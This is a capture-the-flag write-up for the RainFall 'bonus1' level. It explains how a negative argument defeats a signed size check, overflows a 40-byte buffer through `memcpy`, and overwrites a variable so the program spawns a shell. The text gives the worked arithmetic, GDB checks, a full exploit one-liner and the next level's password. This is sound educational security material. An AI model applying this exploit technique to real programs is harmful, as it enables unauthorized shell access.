# bonus1: Integer Overflow Exploitation

## Challenge Overview

The program `bonus1` takes two arguments: a number and a string. It has a check that limits the number to values less than 10, but due to an integer overflow vulnerability, we can bypass this check and trigger a shell by manipulating the program's memory.

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  int result;
  char buffer[40];
  int number;

  number = atoi(argv[1]);
  if (number < 10) {
    memcpy(buffer, argv[2], number * 4);
    if (number == 0x574f4c46) {  // Hex value for "FLOW" in little-endian
      execl("/bin/sh", "sh", NULL);
    }
    result = 0;
  }
  else {
    result = 1;
  }
  return result;
}
```

The program follows this execution flow:

1. It takes the first command-line argument and converts it to an integer using `atoi()`
2. It checks if this number is less than 10
3. If so, it copies `number * 4` bytes from the second argument into a 40-byte buffer
4. Then it checks if `number` equals `0x574f4c46` (ASCII "FLOW" in little-endian)
5. If this condition is met, it spawns a shell using `execl()`

## Vulnerability Analysis

The vulnerability in this program centers around two key issues:

1. **Integer Overflow Vulnerability**:

   - When a negative number is provided as the first argument, it will pass the `number < 10` check
   - However, when this negative number is multiplied by 4 and passed to `memcpy()`, an integer overflow occurs
   - Since `memcpy()`'s third parameter (size) is interpreted as an unsigned value, a carefully chosen negative number can result in a very large or specific positive value

2. **Buffer Overflow Vulnerability**:

   - The destination buffer is only 40 bytes
   - By exploiting the integer overflow, we can make `memcpy()` write more than 40 bytes
   - This allows us to overwrite adjacent memory, including the `number` variable itself

3. **Memory Layout**:
   - Through debugging, we can confirm that the `number` variable is stored immediately after the `buffer` array in memory
   - This means that bytes 40-43 in our overflow will overwrite the `number` variable

## Exploitation Strategy

Our approach is to:

1. Use a negative number that passes the `number < 10` check
2. Make sure this number, when multiplied by 4 and interpreted as an unsigned value, equals exactly 44 (40 bytes for the buffer + 4 bytes to overwrite `number`)
3. Craft a payload where the last 4 bytes will overwrite `number` with `0x574f4c46` ("FLOW")
4. When the comparison executes, `number == 0x574f4c46` will be true, and we get a shell

## Precise Integer Calculation

We need a negative integer that:

- Is less than 10 (to pass the check)
- When multiplied by 4 and interpreted as unsigned, equals 44

1. We need to find a number that, when multiplied by 4 and interpreted as unsigned, equals 44 bytes

2. When a negative number gets interpreted as unsigned in a 32-bit system, it wraps around:

   - For a negative value -X, its unsigned interpretation is (2^32 - X)

3. Let's call our target number n:

   - When n is multiplied by 4: n \* 4
   - This must equal 44 when interpreted as unsigned

4. Working backwards:
   - We need (n \* 4) interpreted as unsigned = 44
   - If n is negative, then (n \* 4) is also negative
   - A negative value -X becomes (2^32 - X) when interpreted as unsigned
   - So we need: 2^32 - (-n \* 4) = 44
   - Simplifying: 2^32 + 4n = 44
   - Therefore: 4n = 44 - 2^32
   - 4n = 44 - 4,294,967,296
   - 4n = -4,294,967,252
   - n = -4,294,967,252 ÷ 4
   - n = -1,073,741,813

Therefore, our target value is `-1,073,741,813`. When this is multiplied by 4, the result will be interpreted as exactly 44 bytes by memcpy(), allowing us to overflow the buffer by just the right amount to overwrite the number variable.

## GDB Verification

To verify our understanding of the memory layout, we examined the program in GDB:

```
(gdb) run 9 "AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIKKKKLLLLMMMMNNNNOOOO"
(gdb) x/40b $esp+0x14  # Examining where buffer begins
...
(gdb) x/44b $esp+0x14  # Looking at buffer + 4 more bytes
```

This confirmed:

- The 40-byte buffer is filled with our input
- Bytes 40-43 (which overflow the buffer) overwrite the `number` variable
- With our calculated value of `-1,073,741,813`, `memcpy()` will copy exactly 44 bytes

## Final Exploit

```bash
./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

This exploit:

1. Passes `-1,073,741813` as the first argument, which:
   - Is negative, so it passes the `number < 10` check
   - When multiplied by 4, causes an integer overflow resulting in exactly 44 bytes being copied
2. The second argument is:
   - 40 'A's to fill the buffer
   - Followed by `\x46\x4c\x4f\x57` (FLOW in little-endian)
3. After the `memcpy()`:
   - The buffer is filled with 40 'A's
   - The `number` variable is overwritten with `0x574f4c46`
4. The condition `number == 0x574f4c46` evaluates to true, spawning a shell

## Getting the Password

After executing the exploit, we gained a shell with bonus1 privileges and retrieved the password:

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Moving to Next Level

Use the password to log in as `bonus2` and proceed to the next challenge:

```bash
bonus1@RainFall:~$ su bonus2
Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
bonus2@RainFall:~$
```
